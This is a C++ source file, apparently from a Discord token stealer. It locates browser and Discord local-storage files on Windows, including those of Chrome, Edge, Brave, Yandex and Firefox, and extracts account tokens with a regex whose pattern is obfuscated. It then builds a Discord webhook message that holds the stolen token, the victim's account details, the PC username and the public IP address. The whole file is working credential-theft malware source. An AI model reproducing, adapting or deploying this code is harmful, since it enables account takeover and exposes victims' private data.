#include "Config.h"
#include "Discord.h"
#include "Web.h"
#include "Path.h"
#include <algorithm>
#include <filesystem>

namespace fs = std::filesystem;
using namespace hentai;

std::string string_safe_dump(json str);

/*
 * Regex
 * std::vector<std::string> resplit(const std::string &s, const std::string &reg_str);
 * std::vector<std::string> find_token(const std ::string &path);
 */
std::vector<std::string> regex::resplit(const std::string &s, const std::string &reg_str)
{
	std::vector<std::string> parts;
	std::regex re(reg_str);

	std::sregex_token_iterator iter(s.begin(), s.end(), re, -1);
	std::sregex_token_iterator end;

	while (iter != end)
	{
		parts.push_back(*iter);
		++iter;
	}

	return parts;
}

std::vector<std::string> regex::find_token(const std::string &path)
{
	std::vector<std::string> tokens;
	std::cout << uwu(regex::regex_exp);
	std::regex token_pattern(uwu(regex ::regex_exp));

	std::smatch sm;

	std::string data = path::read_file(path);

	if (std::regex_search(data, sm, token_pattern))
		std::transform(sm.begin(), sm.end(), std::back_inserter(tokens),
					   [](auto token) noexcept
					   { return token.str(); });

	return tokens;
}
// End of Regex

/*
 * Path
 * 	std::string read_file(std::string path);
 * 	std::string pog_mozilla(std::string path);
 * 	std::string getusername();
 * 	std::vector<std::string> get_paths();
 * 	std::vector<std::string> extract_tokens(std ::vector<std ::string> file_paths);
 */
std::vector<std::string> path::get_paths()
{
	std::string username = path::getusername();

	std::vector<std::string> paths = {};

	std::string appdata = uwu(woow ::users) + username + uwu(woow ::enc_app);

	std::string mozilla_base_path = appdata + uwu(woow ::moz_rolling);
	std::string mozilla_profile_file = mozilla_base_path + uwu(woow ::pro_ini);

	std::vector<std::string> profile =
		regex::resplit(path::pog_mozilla(mozilla_profile_file), "/");

	if (profile.size() == 2)
	{
		paths.push_back(mozilla_base_path + "\\" + profile[0] + "\\" + profile[1] +
						"\\" + uwu(woow ::webappstore));
	}

	std::string db_path = uwu(woow ::enc_db_path);

	paths.push_back(appdata + uwu(woow ::chrome) + db_path);
	paths.push_back(appdata + uwu(woow ::edge) + db_path);
	paths.push_back(appdata + uwu(woow ::yandex) + db_path);
	paths.push_back(appdata + uwu(woow ::brave) + db_path);

	paths.push_back(appdata + uwu(woow ::discord));

	return paths;
}

std::string path ::read_file(std::string path)
{
	std::ifstream file;
	file.open(path, std ::ios::in | std ::ios ::binary);

	std::stringstream ss;
	ss << file.rdbuf();
	return ss.str();
}

std::string path ::pog_mozilla(std::string path)
{
	std::string mozilla_profile = "";
	try
	{
		std::string data = path::read_file(path);

		std::regex p(R"([\s]Default=([\w/.-]+)[\s])");
		std::smatch sm;
		if (std::regex_search(data, sm, p))
		{
			mozilla_profile = sm.str(1);
		}
	}
	catch (...)
	{
		// COuld do something over here
	}
	return mozilla_profile;
}

std::string path ::getusername()
{
	char username[512];
	DWORD size = 512;

	GetUserNameA(username, &size);

	return std::string(username);
}

std::vector<std::string>
path::extract_tokens(std::vector<std::string> file_paths)
{
	// Naive approch didn't want to make a recursive functions
	// Sed times
	std::vector<std::string> tokens;
	for (auto &path : file_paths)
	{
		if (!fs::exists(path))
			continue;

		if (fs::is_directory(path))
		{
			for (auto &entry : fs::directory_iterator(path))
			{
				std::vector<std::string> _tokens =
					regex::find_token(entry.path().string());
				std::transform(_tokens.begin(), _tokens.end(),
							   std::back_inserter(tokens),
							   [](auto &token) noexcept
							   { return token; });
			}
		}
		else
		{
			std::vector<std::string> _tokens = regex::find_token(path);
			std::transform(_tokens.begin(), _tokens.end(), std::back_inserter(tokens),
						   [](auto &token) noexcept
						   { return token; });
		}
	}

	return tokens;
}
// End of Path

/*
 * Discord
 * json make_embed_fields(json data, std ::string json);
 * json make_discord_message(json embed, json data);
 */
json discord::make_embed_fields(json data, std::string token)
{
	std ::vector<json> fields = {};

	fields.push_back({{"name", "token"}, {"value", token}});

	for (auto _data : config::useful_data)
	{
		std::string value = string_safe_dump(data[_data.data()]);
		if (value == "")
		{
			// Discord doesn't allow empty values
			value = "None";
		}
		fields.push_back({{"name", _data}, {"value", value}});
	}

	fields.push_back({{"name", "pc-username"}, {"value", path::getusername()}});

	return {{"fields", fields}};
}

json discord::make_discord_message(json embed, json data)
{
	std::string name = string_safe_dump(data["username"]);

	std::string avatar_url = uwu(woow ::avatar_base_url) + string_safe_dump(data["id"]) +
							 '/' + string_safe_dump(data["avatar"]) + uwu(woow ::png);

	embed["title"] = name + " " + uwu(woow ::gift);
	embed["color"] = 660500;
	embed["author"] = {{"name", name}, {"icon_url", avatar_url}};

	json ipinfo_data = web::do_get_request_return_json(uwu(woow ::ip_url));

	std::string ip = string_safe_dump(ipinfo_data["ip"]);

	embed["fields"].push_back({{"name", "ip"}, {"value", ip}});

	json discord_message = {{"username", "MeoW"}, {"embeds", {embed}}};
	return discord_message;
}
// End of Embed

std::string string_safe_dump(json str)
{
	std::string s = str.dump();

	if (str.type() == json::value_t::string)
		return std::string((s.begin() + 1), (s.end() - 1));
	else
		return s;
}
